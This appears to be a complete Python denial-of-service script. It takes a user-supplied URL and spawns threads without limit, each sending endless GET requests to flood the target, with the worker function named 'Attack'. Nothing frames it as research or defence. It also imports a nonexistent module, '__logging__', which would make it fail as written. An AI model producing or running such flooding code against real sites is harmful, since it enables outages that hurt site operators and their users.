import __logging__ as log
import json
import requests
import threading
link=input("# Enter your link > ")
def Attack():
    while True:
        try:
            if requests.get(url=link).status_code==200:
                print("Ok")
            else:
                print("Bad")
        except:
            print("Errors")
thread=0
while True:
    threading.Thread(target=Attack).start()
    thread+=1
    print(thread)